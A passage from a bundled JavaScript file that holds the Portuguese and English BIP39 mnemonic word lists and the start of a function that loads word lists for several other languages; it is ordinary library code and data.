mbiente","ameixa","amenizar","amido","amistoso","amizade","amolador","amontoar","amoroso","amostra","amparar","ampliar","ampola","anagrama","analisar","anarquia","anatomia","andaime","anel","anexo","angular","animar","anjo","anomalia","anotado","ansioso","anterior","anuidade","anunciar","anzol","apagador","apalpar","apanhado","apego","apelido","apertada","apesar","apetite","apito","aplauso","aplicada","apoio","apontar","aposta","aprendiz","aprovar","aquecer","arame","aranha","arara","arcada","ardente","areia","arejar","arenito","aresta","argiloso","argola","arma","arquivo","arraial","arrebate","arriscar","arroba","arrumar","arsenal","arterial","artigo","arvoredo","asfaltar","asilado","aspirar","assador","assinar","assoalho","assunto","astral","atacado","atadura","atalho","atarefar","atear","atender","aterro","ateu","atingir","atirador","ativo","atoleiro","atracar","atrevido","atriz","atual","atum","auditor","aumentar","aura","aurora","autismo","autoria","autuar","avaliar","avante","avaria","avental","avesso","aviador","avisar","avulso","axila","azarar","azedo","azeite","azulejo","babar","babosa","bacalhau","bacharel","bacia","bagagem","baiano","bailar","baioneta","bairro","baixista","bajular","baleia","baliza","balsa","banal","bandeira","banho","banir","banquete","barato","barbado","baronesa","barraca","barulho","baseado","bastante","batata","batedor","batida","batom","batucar","baunilha","beber","beijo","beirada","beisebol","beldade","beleza","belga","beliscar","bendito","bengala","benzer","berimbau","berlinda","berro","besouro","bexiga","bezerro","bico","bicudo","bienal","bifocal","bifurcar","bigorna","bilhete","bimestre","bimotor","biologia","biombo","biosfera","bipolar","birrento","biscoito","bisneto","bispo","bissexto","bitola","bizarro","blindado","bloco","bloquear","boato","bobagem","bocado","bocejo","bochecha","boicotar","bolada","boletim","bolha","bolo","bombeiro","bonde","boneco","bonita","borbulha","borda","boreal","borracha","bovino","boxeador","branco","brasa","braveza","breu","briga","brilho","brincar","broa","brochura","bronzear","broto","bruxo","bucha","budismo","bufar","bule","buraco","busca","busto","buzina","cabana","cabelo","cabide","cabo","cabrito","cacau","cacetada","cachorro","cacique","cadastro","cadeado","cafezal","caiaque","caipira","caixote","cajado","caju","calafrio","calcular","caldeira","calibrar","calmante","calota","camada","cambista","camisa","camomila","campanha","camuflar","canavial","cancelar","caneta","canguru","canhoto","canivete","canoa","cansado","cantar","canudo","capacho","capela","capinar","capotar","capricho","captador","capuz","caracol","carbono","cardeal","careca","carimbar","carneiro","carpete","carreira","cartaz","carvalho","casaco","casca","casebre","castelo","casulo","catarata","cativar","caule","causador","cautelar","cavalo","caverna","cebola","cedilha","cegonha","celebrar","celular","cenoura","censo","centeio","cercar","cerrado","certeiro","cerveja","cetim","cevada","chacota","chaleira","chamado","chapada","charme","chatice","chave","chefe","chegada","cheiro","cheque","chicote","chifre","chinelo","chocalho","chover","chumbo","chutar","chuva","cicatriz","ciclone","cidade","cidreira","ciente","cigana","cimento","cinto","cinza","ciranda","circuito","cirurgia","citar","clareza","clero","clicar","clone","clube","coado","coagir","cobaia","cobertor","cobrar","cocada","coelho","coentro","coeso","cogumelo","coibir","coifa","coiote","colar","coleira","colher","colidir","colmeia","colono","coluna","comando","combinar","comentar","comitiva","comover","complexo","comum","concha","condor","conectar","confuso","congelar","conhecer","conjugar","consumir","contrato","convite","cooperar","copeiro","copiador","copo","coquetel","coragem","cordial","corneta","coronha","corporal","correio","cortejo","coruja","corvo","cosseno","costela","cotonete","couro","couve","covil","cozinha","cratera","cravo","creche","credor","creme","crer","crespo","criada","criminal","crioulo","crise","criticar","crosta","crua","cruzeiro","cubano","cueca","cuidado","cujo","culatra","culminar","culpar","cultura","cumprir","cunhado","cupido","curativo","curral","cursar","curto","cuspir","custear","cutelo","damasco","datar","debater","debitar","deboche","debulhar","decalque","decimal","declive","decote","decretar","dedal","dedicado","deduzir","defesa","defumar","degelo","degrau","degustar","deitado","deixar","delator","delegado","delinear","delonga","demanda","demitir","demolido","dentista","depenado","depilar","depois","depressa","depurar","deriva","derramar","desafio","desbotar","descanso","desenho","desfiado","desgaste","desigual","deslize","desmamar","desova","despesa","destaque","desviar","detalhar","detentor","detonar","detrito","deusa","dever","devido","devotado","dezena","diagrama","dialeto","didata","difuso","digitar","dilatado","diluente","diminuir","dinastia","dinheiro","diocese","direto","discreta","disfarce","disparo","disquete","dissipar","distante","ditador","diurno","diverso","divisor","divulgar","dizer","dobrador","dolorido","domador","dominado","donativo","donzela","dormente","dorsal","dosagem","dourado","doutor","drenagem","drible","drogaria","duelar","duende","dueto","duplo","duquesa","durante","duvidoso","eclodir","ecoar","ecologia","edificar","edital","educado","efeito","efetivar","ejetar","elaborar","eleger","eleitor","elenco","elevador","eliminar","elogiar","embargo","embolado","embrulho","embutido","emenda","emergir","emissor","empatia","empenho","empinado","empolgar","emprego","empurrar","emulador","encaixe","encenado","enchente","encontro","endeusar","endossar","enfaixar","enfeite","enfim","engajado","engenho","englobar","engomado","engraxar","enguia","enjoar","enlatar","enquanto","enraizar","enrolado","enrugar","ensaio","enseada","ensino","ensopado","entanto","enteado","entidade","entortar","entrada","entulho","envergar","enviado","envolver","enxame","enxerto","enxofre","enxuto","epiderme","equipar","ereto","erguido","errata","erva","ervilha","esbanjar","esbelto","escama","escola","escrita","escuta","esfinge","esfolar","esfregar","esfumado","esgrima","esmalte","espanto","espelho","espiga","esponja","espreita","espumar","esquerda","estaca","esteira","esticar","estofado","estrela","estudo","esvaziar","etanol","etiqueta","euforia","europeu","evacuar","evaporar","evasivo","eventual","evidente","evoluir","exagero","exalar","examinar","exato","exausto","excesso","excitar","exclamar","executar","exemplo","exibir","exigente","exonerar","expandir","expelir","expirar","explanar","exposto","expresso","expulsar","externo","extinto","extrato","fabricar","fabuloso","faceta","facial","fada","fadiga","faixa","falar","falta","familiar","fandango","fanfarra","fantoche","fardado","farelo","farinha","farofa","farpa","fartura","fatia","fator","favorita","faxina","fazenda","fechado","feijoada","feirante","felino","feminino","fenda","feno","fera","feriado","ferrugem","ferver","festejar","fetal","feudal","fiapo","fibrose","ficar","ficheiro","figurado","fileira","filho","filme","filtrar","firmeza","fisgada","fissura","fita","fivela","fixador","fixo","flacidez","flamingo","flanela","flechada","flora","flutuar","fluxo","focal","focinho","fofocar","fogo","foguete","foice","folgado","folheto","forjar","formiga","forno","forte","fosco","fossa","fragata","fralda","frango","frasco","fraterno","freira","frente","fretar","frieza","friso","fritura","fronha","frustrar","fruteira","fugir","fulano","fuligem","fundar","fungo","funil","furador","furioso","futebol","gabarito","gabinete","gado","gaiato","gaiola","gaivota","galega","galho","galinha","galocha","ganhar","garagem","garfo","gargalo","garimpo","garoupa","garrafa","gasoduto","gasto","gata","gatilho","gaveta","gazela","gelado","geleia","gelo","gemada","gemer","gemido","generoso","gengiva","genial","genoma","genro","geologia","gerador","germinar","gesso","gestor","ginasta","gincana","gingado","girafa","girino","glacial","glicose","global","glorioso","goela","goiaba","golfe","golpear","gordura","gorjeta","gorro","gostoso","goteira","governar","gracejo","gradual","grafite","gralha","grampo","granada","gratuito","graveto","graxa","grego","grelhar","greve","grilo","grisalho","gritaria","grosso","grotesco","grudado","grunhido","gruta","guache","guarani","guaxinim","guerrear","guiar","guincho","guisado","gula","guloso","guru","habitar","harmonia","haste","haver","hectare","herdar","heresia","hesitar","hiato","hibernar","hidratar","hiena","hino","hipismo","hipnose","hipoteca","hoje","holofote","homem","honesto","honrado","hormonal","hospedar","humorado","iate","ideia","idoso","ignorado","igreja","iguana","ileso","ilha","iludido","iluminar","ilustrar","imagem","imediato","imenso","imersivo","iminente","imitador","imortal","impacto","impedir","implante","impor","imprensa","impune","imunizar","inalador","inapto","inativo","incenso","inchar","incidir","incluir","incolor","indeciso","indireto","indutor","ineficaz","inerente","infantil","infestar","infinito","inflamar","informal","infrator","ingerir","inibido","inicial","inimigo","injetar","inocente","inodoro","inovador","inox","inquieto","inscrito","inseto","insistir","inspetor","instalar","insulto","intacto","integral","intimar","intocado","intriga","invasor","inverno","invicto","invocar","iogurte","iraniano","ironizar","irreal","irritado","isca","isento","isolado","isqueiro","italiano","janeiro","jangada","janta","jararaca","jardim","jarro","jasmim","jato","javali","jazida","jejum","joaninha","joelhada","jogador","joia","jornal","jorrar","jovem","juba","judeu","judoca","juiz","julgador","julho","jurado","jurista","juro","justa","labareda","laboral","lacre","lactante","ladrilho","lagarta","lagoa","laje","lamber","lamentar","laminar","lampejo","lanche","lapidar","lapso","laranja","lareira","largura","lasanha","lastro","lateral","latido","lavanda","lavoura","lavrador","laxante","lazer","lealdade","lebre","legado","legendar","legista","leigo","leiloar","leitura","lembrete","leme","lenhador","lentilha","leoa","lesma","leste","letivo","letreiro","levar","leveza","levitar","liberal","libido","liderar","ligar","ligeiro","limitar","limoeiro","limpador","linda","linear","linhagem","liquidez","listagem","lisura","litoral","livro","lixa","lixeira","locador","locutor","lojista","lombo","lona","longe","lontra","lorde","lotado","loteria","loucura","lousa","louvar","luar","lucidez","lucro","luneta","lustre","lutador","luva","macaco","macete","machado","macio","madeira","madrinha","magnata","magreza","maior","mais","malandro","malha","malote","maluco","mamilo","mamoeiro","mamute","manada","mancha","mandato","manequim","manhoso","manivela","manobrar","mansa","manter","manusear","mapeado","maquinar","marcador","maresia","marfim","margem","marinho","marmita","maroto","marquise","marreco","martelo","marujo","mascote","masmorra","massagem","mastigar","matagal","materno","matinal","matutar","maxilar","medalha","medida","medusa","megafone","meiga","melancia","melhor","membro","memorial","menino","menos","mensagem","mental","merecer","mergulho","mesada","mesclar","mesmo","mesquita","mestre","metade","meteoro","metragem","mexer","mexicano","micro","migalha","migrar","milagre","milenar","milhar","mimado","minerar","minhoca","ministro","minoria","miolo","mirante","mirtilo","misturar","mocidade","moderno","modular","moeda","moer","moinho","moita","moldura","moleza","molho","molinete","molusco","montanha","moqueca","morango","morcego","mordomo","morena","mosaico","mosquete","mostarda","motel","motim","moto","motriz","muda","muito","mulata","mulher","multar","mundial","munido","muralha","murcho","muscular","museu","musical","nacional","nadador","naja","namoro","narina","narrado","nascer","nativa","natureza","navalha","navegar","navio","neblina","nebuloso","negativa","negociar","negrito","nervoso","neta","neural","nevasca","nevoeiro","ninar","ninho","nitidez","nivelar","nobreza","noite","noiva","nomear","nominal","nordeste","nortear","notar","noticiar","noturno","novelo","novilho","novo","nublado","nudez","numeral","nupcial","nutrir","nuvem","obcecado","obedecer","objetivo","obrigado","obscuro","obstetra","obter","obturar","ocidente","ocioso","ocorrer","oculista","ocupado","ofegante","ofensiva","oferenda","oficina","ofuscado","ogiva","olaria","oleoso","olhar","oliveira","ombro","omelete","omisso","omitir","ondulado","oneroso","ontem","opcional","operador","oponente","oportuno","oposto","orar","orbitar","ordem","ordinal","orfanato","orgasmo","orgulho","oriental","origem","oriundo","orla","ortodoxo","orvalho","oscilar","ossada","osso","ostentar","otimismo","ousadia","outono","outubro","ouvido","ovelha","ovular","oxidar","oxigenar","pacato","paciente","pacote","pactuar","padaria","padrinho","pagar","pagode","painel","pairar","paisagem","palavra","palestra","palheta","palito","palmada","palpitar","pancada","panela","panfleto","panqueca","pantanal","papagaio","papelada","papiro","parafina","parcial","pardal","parede","partida","pasmo","passado","pastel","patamar","patente","patinar","patrono","paulada","pausar","peculiar","pedalar","pedestre","pediatra","pedra","pegada","peitoral","peixe","pele","pelicano","penca","pendurar","peneira","penhasco","pensador","pente","perceber","perfeito","pergunta","perito","permitir","perna","perplexo","persiana","pertence","peruca","pescado","pesquisa","pessoa","petiscar","piada","picado","piedade","pigmento","pilastra","pilhado","pilotar","pimenta","pincel","pinguim","pinha","pinote","pintar","pioneiro","pipoca","piquete","piranha","pires","pirueta","piscar","pistola","pitanga","pivete","planta","plaqueta","platina","plebeu","plumagem","pluvial","pneu","poda","poeira","poetisa","polegada","policiar","poluente","polvilho","pomar","pomba","ponderar","pontaria","populoso","porta","possuir","postal","pote","poupar","pouso","povoar","praia","prancha","prato","praxe","prece","predador","prefeito","premiar","prensar","preparar","presilha","pretexto","prevenir","prezar","primata","princesa","prisma","privado","processo","produto","profeta","proibido","projeto","prometer","propagar","prosa","protetor","provador","publicar","pudim","pular","pulmonar","pulseira","punhal","punir","pupilo","pureza","puxador","quadra","quantia","quarto","quase","quebrar","queda","queijo","quente","querido","quimono","quina","quiosque","rabanada","rabisco","rachar","racionar","radial","raiar","rainha","raio","raiva","rajada","ralado","ramal","ranger","ranhura","rapadura","rapel","rapidez","raposa","raquete","raridade","rasante","rascunho","rasgar","raspador","rasteira","rasurar","ratazana","ratoeira","realeza","reanimar","reaver","rebaixar","rebelde","rebolar","recado","recente","recheio","recibo","recordar","recrutar","recuar","rede","redimir","redonda","reduzida","reenvio","refinar","refletir","refogar","refresco","refugiar","regalia","regime","regra","reinado","reitor","rejeitar","relativo","remador","remendo","remorso","renovado","reparo","repelir","repleto","repolho","represa","repudiar","requerer","resenha","resfriar","resgatar","residir","resolver","respeito","ressaca","restante","resumir","retalho","reter","retirar","retomada","retratar","revelar","revisor","revolta","riacho","rica","rigidez","rigoroso","rimar","ringue","risada","risco","risonho","robalo","rochedo","rodada","rodeio","rodovia","roedor","roleta","romano","roncar","rosado","roseira","rosto","rota","roteiro","rotina","rotular","rouco","roupa","roxo","rubro","rugido","rugoso","ruivo","rumo","rupestre","russo","sabor","saciar","sacola","sacudir","sadio","safira","saga","sagrada","saibro","salada","saleiro","salgado","saliva","salpicar","salsicha","saltar","salvador","sambar","samurai","sanar","sanfona","sangue","sanidade","sapato","sarda","sargento","sarjeta","saturar","saudade","saxofone","sazonal","secar","secular","seda","sedento","sediado","sedoso","sedutor","segmento","segredo","segundo","seiva","seleto","selvagem","semanal","semente","senador","senhor","sensual","sentado","separado","sereia","seringa","serra","servo","setembro","setor","sigilo","silhueta","silicone","simetria","simpatia","simular","sinal","sincero","singular","sinopse","sintonia","sirene","siri","situado","soberano","sobra","socorro","sogro","soja","solda","soletrar","solteiro","sombrio","sonata","sondar","sonegar","sonhador","sono","soprano","soquete","sorrir","sorteio","sossego","sotaque","soterrar","sovado","sozinho","suavizar","subida","submerso","subsolo","subtrair","sucata","sucesso","suco","sudeste","sufixo","sugador","sugerir","sujeito","sulfato","sumir","suor","superior","suplicar","suposto","suprimir","surdina","surfista","surpresa","surreal","surtir","suspiro","sustento","tabela","tablete","tabuada","tacho","tagarela","talher","talo","talvez","tamanho","tamborim","tampa","tangente","tanto","tapar","tapioca","tardio","tarefa","tarja","tarraxa","tatuagem","taurino","taxativo","taxista","teatral","tecer","tecido","teclado","tedioso","teia","teimar","telefone","telhado","tempero","tenente","tensor","tentar","termal","terno","terreno","tese","tesoura","testado","teto","textura","texugo","tiara","tigela","tijolo","timbrar","timidez","tingido","tinteiro","tiragem","titular","toalha","tocha","tolerar","tolice","tomada","tomilho","tonel","tontura","topete","tora","torcido","torneio","torque","torrada","torto","tostar","touca","toupeira","toxina","trabalho","tracejar","tradutor","trafegar","trajeto","trama","trancar","trapo","traseiro","tratador","travar","treino","tremer","trepidar","trevo","triagem","tribo","triciclo","tridente","trilogia","trindade","triplo","triturar","triunfal","trocar","trombeta","trova","trunfo","truque","tubular","tucano","tudo","tulipa","tupi","turbo","turma","turquesa","tutelar","tutorial","uivar","umbigo","unha","unidade","uniforme","urologia","urso","urtiga","urubu","usado","usina","usufruir","vacina","vadiar","vagaroso","vaidoso","vala","valente","validade","valores","vantagem","vaqueiro","varanda","vareta","varrer","vascular","vasilha","vassoura","vazar","vazio","veado","vedar","vegetar","veicular","veleiro","velhice","veludo","vencedor","vendaval","venerar","ventre","verbal","verdade","vereador","vergonha","vermelho","verniz","versar","vertente","vespa","vestido","vetorial","viaduto","viagem","viajar","viatura","vibrador","videira","vidraria","viela","viga","vigente","vigiar","vigorar","vilarejo","vinco","vinheta","vinil","violeta","virada","virtude","visitar","visto","vitral","viveiro","vizinho","voador","voar","vogal","volante","voleibol","voltagem","volumoso","vontade","vulto","vuvuzela","xadrez","xarope","xeque","xeretar","xerife","xingar","zangado","zarpar","zebu","zelador","zombar","zoologia","zumbido"]')
  , require$$9 = JSON.parse('["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad","damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf","dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expire","explain","expose","express","extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","feature","february","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital","host","hotel","hour","hover","hub","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice","icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know","lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","maple","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nasty","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole","police","pond","pony","pool","popular","portion","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"]');
var hasRequired_wordlists;
function require_wordlists() {
    if (hasRequired_wordlists)
        return _wordlists;
    hasRequired_wordlists = 1,
    Object.defineProperty(_wordlists, "__esModule", {
        value: !0
    });
    const _ = {};
    _wordlists.wordlists = _;
    let M;
    _wordlists._default = M;
    try {
        _wordlists._default = M = require$$0$4,
        _.czech = M
    } catch {}
    try {
        _wordlists._default = M = require$$1$5,
        _.chinese_simplified = M
    } catch {}
    try {
        _wordlists._default = M = require$$2$2,
        _.chinese_traditional = M
    } catch {}
    try {
        _wordlists._default = M = require$$3,
        _.korean = M
    } catch {}
    try {
        _wordlists._default = M = require$$4$1,
        _.french = M
    } catch {}
    try {
        _wordlists._default = M = require$$5$1,
        _.italian = M
    } catch {}
    try {
        _wordlists._default = M = require$$6$1,
        _.spanish = M
    } catch {}
    try {
        _wordlists._default = M = require$$7,
        _.japanese = M,
        _.JA = M
    } catch {}
